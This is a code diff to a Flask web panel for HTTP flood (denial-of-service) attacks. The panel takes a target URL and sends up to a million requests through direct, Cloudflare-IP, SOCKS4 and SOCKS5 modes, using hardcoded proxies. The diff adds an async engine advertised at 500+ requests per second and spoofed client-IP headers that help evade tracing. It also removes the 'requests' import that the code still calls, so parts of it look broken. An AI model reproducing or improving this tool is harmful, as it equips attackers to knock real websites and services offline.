@@ -1,9 +1,11 @@
 from flask import Flask, request, jsonify, render_template_string
-import requests
 import threading
 import time
 import random
 from datetime import datetime
+import asyncio
+import aiohttp
+from aiohttp import ClientSession, TCPConnector, ClientTimeout
 
 app = Flask(__name__)
 
@@ -18,6 +20,13 @@ attack_logs = []
 CF_IPS = ["104.21.0.1","104.21.0.2","104.21.0.3","104.21.0.4","104.21.0.5","104.16.0.1","104.16.0.2"]
 SOCKS5_PROXIES = ["94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080","176.114.86.151:1080"]
 SOCKS4_PROXIES = ["174.64.199.82:4145","68.71.241.33:4145","142.54.228.193:4145","88.204.142.108:1080"]
+
+# 🎭 Fake IP Pool for Header Spoofing
+FAKE_IPS = [
+    "103.12.198.45", "45.79.89.12", "172.67.154.23", "141.101.99.56",
+    "190.210.45.78", "88.12.34.67", "77.111.245.12", "212.70.149.3",
+    "51.15.234.89", "185.220.101.34", "23.129.64.210", "198.98.57.187"
+]
 
 # ============================================
 # UI - ULTRA KILLER VIBES
@@ -100,7 +109,7 @@ label{color:#888;font-size:10px;text-transform:uppercase;letter-spacing:2px;disp
 <div class="row"><div><label>TARGET URL</label><input id="url" placeholder="https://target.com/api"></div><div><label>REQUESTS</label><input type="number" id="count" value="1000"></div></div>
 <label>ATTACK MODE</label>
 <select id="mode">
-<option value="direct">⚡ DIRECT (Fastest)</option>
+<option value="direct">⚡ DIRECT (500+/sec Real Requests)</option>
 <option value="cf">🌐 Cloudflare IP Rotation</option>
 <option value="socks5">🔒 SOCKS5 Proxy</option>
 <option value="socks4">🔒 SOCKS4 Proxy</option>
@@ -108,7 +117,7 @@ label{color:#888;font-size:10px;text-transform:uppercase;letter-spacing:2px;disp
 <option value="all">☠️ ALL METHODS</option>
 </select>
 <label>SPEED</label>
-<select id="speed"><option value="slow">🐢 Slow</option><option value="fast" selected>⚡ Fast</option><option value="ultra">💀 ULTRA</option></select>
+<select id="speed"><option value="slow">🐢 Slow</option><option value="fast" selected>⚡ Fast</option><option value="ultra">💀 ULTRA (500+/sec)</option></select>
 <button class="btn" onclick="start()">🚀 LAUNCH ATTACK</button>
 <button class="btn btn-stop" onclick="stop()">⏹️ EMERGENCY STOP</button>
 <div id="status"></div>
@@ -126,42 +135,131 @@ setInterval(()=>{l();u()},1000)
 </script></body></html>"""
 
 # ============================================
-# ✅ ATTACK ENGINE - ALL MODES
+# 🚀 ULTRA FAST ASYNC DIRECT ENGINE (500+ req/sec)
+# ============================================
+async def send_request_async(session, url, fake_ip):
+    """Single async request with fake IP header"""
+    headers = {
+        "User-Agent": random.choice([
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
+            "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+        ]),
+        "X-Forwarded-For": fake_ip,
+        "X-Real-IP": fake_ip,
+        "Client-IP": fake_ip,
+        "CF-Connecting-IP": fake_ip,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+        "Cache-Control": "no-cache"
+    }
+    try:
+        async with session.get(url, headers=headers, timeout=ClientTimeout(total=10), ssl=False) as resp:
+            await resp.read()  # Read full response = REAL request
+            return resp.status < 500  # Success if status < 500
+    except:
+        return False
+
+async def run_direct_ultra(attack_id, url, count):
+    """ULTRA FAST DIRECT - 500+ real requests/sec with IP rotation"""
+    connector = TCPConnector(limit=0, force_close=False, enable_cleanup_closed=True)
+    timeout = ClientTimeout(total=10)
+    
+    async with ClientSession(connector=connector, timeout=timeout) as session:
+        BATCH_SIZE = 500  # Process 500 requests simultaneously
+        
+        for batch_start in range(0, count, BATCH_SIZE):
+            if attack_id not in active_attacks:
+                break
+            
+            batch_end = min(batch_start + BATCH_SIZE, count)
+            batch_count = batch_end - batch_start
+            
+            # Create all tasks for this batch
+            tasks = []
+            for i in range(batch_count):
+                fake_ip = random.choice(FAKE_IPS)
+                task = asyncio.ensure_future(send_request_async(session, url, fake_ip))
+                tasks.append(task)
+            
+            # Execute all at once
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            
+            # Count results
+            for r in results:
+                if r is True:
+                    attack_stats["success"] += 1
+                else:
+                    attack_stats["failed"] += 1
+                attack_stats["total"] += 1
+            
+            # Log progress
+            attack_logs.append(f"⚡ [DIRECT-ULTRA] ✅{attack_stats['success']} ❌{attack_stats['failed']} 📊{attack_stats['total']}/{count}")
+            if len(attack_logs) > 100:
+                attack_logs.pop(0)
+    
+    if attack_id in active_attacks:
+        del active_attacks[attack_id]
+    attack_logs.append(f"🏁 COMPLETE: ✅{attack_stats['success']} ❌{attack_stats['failed']} | MODE: DIRECT ULTRA")
+
+# ============================================
+# ✅ STANDARD ATTACK ENGINE (for other modes)
 # ============================================
 def send_direct(url):
     try:
-        requests.get(url, timeout=10, headers={"User-Agent":"Mozilla/5.0"})
+        fake_ip = random.choice(FAKE_IPS)
+        headers = {
+            "User-Agent": "Mozilla/5.0",
+            "X-Forwarded-For": fake_ip,
+            "X-Real-IP": fake_ip,
+            "Client-IP": fake_ip
+        }
+        requests.get(url, timeout=10, headers=headers)
         return True
-    except: return False
+    except:
+        return False
 
 def send_cf(url, cf_ip):
     try:
-        headers = {"Host": url.split("/")[2], "User-Agent":"Mozilla/5.0"}
+        fake_ip = random.choice(FAKE_IPS)
+        headers = {
+            "Host": url.split("/")[2],
+            "User-Agent": "Mozilla/5.0",
+            "X-Forwarded-For": fake_ip
+        }
         target = f"https://{cf_ip}/"
         requests.get(target, headers=headers, timeout=10, verify=False)
         return True
-    except: return False
+    except:
+        return False
 
 def send_socks5(url, proxy):
     try:
-        p = {"http":f"socks5://{proxy}","https":f"socks5://{proxy}"}
-        requests.get(url, proxies=p, timeout=15, headers={"User-Agent":"Mozilla/5.0"})
+        p = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
+        requests.get(url, proxies=p, timeout=15, headers={"User-Agent": "Mozilla/5.0"})
         return True
-    except: return False
+    except:
+        return False
 
 def send_socks4(url, proxy):
     try:
-        p = {"http":f"socks4://{proxy}","https":f"socks4://{proxy}"}
-        requests.get(url, proxies=p, timeout=15, headers={"User-Agent":"Mozilla/5.0"})
+        p = {"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"}
+        requests.get(url, proxies=p, timeout=15, headers={"User-Agent": "Mozilla/5.0"})
         return True
-    except: return False
+    except:
+        return False
 
 def run_attack(attack_id, url, count, speed, mode):
-    delays = {"slow":0.1,"fast":0.01,"ultra":0.001}
-    delay = delays.get(speed,0.01)
+    """Standard attack for non-direct modes"""
+    delays = {"slow": 0.1, "fast": 0.01, "ultra": 0.001}
+    delay = delays.get(speed, 0.01)
     
     for i in range(count):
-        if attack_id not in active_attacks: break
+        if attack_id not in active_attacks:
+            break
         
         success = False
         
@@ -183,18 +281,25 @@ def run_attack(attack_id, url, count, speed, mode):
                 success = send_socks5(url, random.choice(SOCKS5_PROXIES))
         elif mode == "all":
             r = random.random()
-            if r < 0.25: success = send_direct(url)
-            elif r < 0.5: success = send_cf(url, random.choice(CF_IPS))
-            elif r < 0.75: success = send_socks5(url, random.choice(SOCKS5_PROXIES))
-            else: success = send_socks4(url, random.choice(SOCKS4_PROXIES))
+            if r < 0.25:
+                success = send_direct(url)
+            elif r < 0.5:
+                success = send_cf(url, random.choice(CF_IPS))
+            elif r < 0.75:
+                success = send_socks5(url, random.choice(SOCKS5_PROXIES))
+            else:
+                success = send_socks4(url, random.choice(SOCKS4_PROXIES))
         
-        if success: attack_stats["success"] += 1
-        else: attack_stats["failed"] += 1
+        if success:
+            attack_stats["success"] += 1
+        else:
+            attack_stats["failed"] += 1
         attack_stats["total"] += 1
         
         if i % 50 == 0:
             attack_logs.append(f"⚡ [{mode.upper()}] ✅{attack_stats['success']} ❌{attack_stats['failed']} 📊{attack_stats['total']}/{count}")
-        if len(attack_logs) > 100: attack_logs.pop(0)
+        if len(attack_logs) > 100:
+            attack_logs.pop(0)
         time.sleep(delay)
     
     if attack_id in active_attacks:
@@ -207,48 +312,66 @@ def run_attack(attack_id, url, count, speed, mode):
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
-        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
+        if request.form.get('user') == ADMIN_USER and request.form.get('pass') == ADMIN_PASS:
             return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
         return render_template_string(LOGIN, error="⛔ ACCESS DENIED")
     return render_template_string(LOGIN, error=None)
 
 @app.route('/dashboard')
 def dashboard():
-    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
+    if request.cookies.get('auth') != 'true':
+        return '<script>location.href="/"</script>'
     return DASH
 
 @app.route('/attack', methods=['POST'])
 def attack():
-    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
+    if request.cookies.get('auth') != 'true':
+        return jsonify({"error": "Unauthorized"}), 403
     d = request.get_json()
-    url = d.get('url','')
-    count = min(d.get('count',100),100000)
-    speed = d.get('speed','fast')
-    mode = d.get('mode','direct')
-    if not url: return jsonify({"error":"URL required"}),400
+    url = d.get('url', '')
+    count = min(d.get('count', 100), 1000000)  # Max 1M requests
+    speed = d.get('speed', 'fast')
+    mode = d.get('mode', 'direct')
+    
+    if not url:
+        return jsonify({"error": "URL required"}), 400
+    
     aid = f"atk_{int(time.time())}"
     active_attacks[aid] = True
     attack_logs.append(f"🔥 TARGET: {url} | MODE: {mode.upper()} | {count} REQ | {speed.upper()}")
-    t = threading.Thread(target=run_attack, args=(aid,url,count,speed,mode))
-    t.daemon=True; t.start()
-    return jsonify({"status":"started"})
+    
+    # 🚀 Use async engine for direct mode with ultra speed
+    if mode == "direct" and speed == "ultra":
+        def run_async():
+            asyncio.run(run_direct_ultra(aid, url, count))
+        t = threading.Thread(target=run_async)
+    else:
+        t = threading.Thread(target=run_attack, args=(aid, url, count, speed, mode))
+    
+    t.daemon = True
+    t.start()
+    return jsonify({"status": "started", "mode": mode, "speed": speed, "count": count})
 
 @app.route('/stop', methods=['POST'])
 def stop():
-    for k in list(active_attacks.keys()): del active_attacks[k]
+    for k in list(active_attacks.keys()):
+        del active_attacks[k]
     attack_logs.append("⏹️ ATTACK TERMINATED BY USER")
-    return jsonify({"status":"stopped"})
+    return jsonify({"status": "stopped"})
 
 @app.route('/logs')
-def logs(): return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-30:]]})
+def logs():
+    return jsonify({"logs": [f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-30:]]})
 
 @app.route('/stats')
-def stats(): return jsonify(attack_stats)
+def stats():
+    return jsonify(attack_stats)
 
 @app.route('/logout')
-def logout(): return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'
+def logout():
+    return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'
 
 if __name__ == "__main__":
     import os
-    port = int(os.environ.get('PORT',5000))
-    app.run(host='0.0.0.0', port=port)
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, threaded=True)
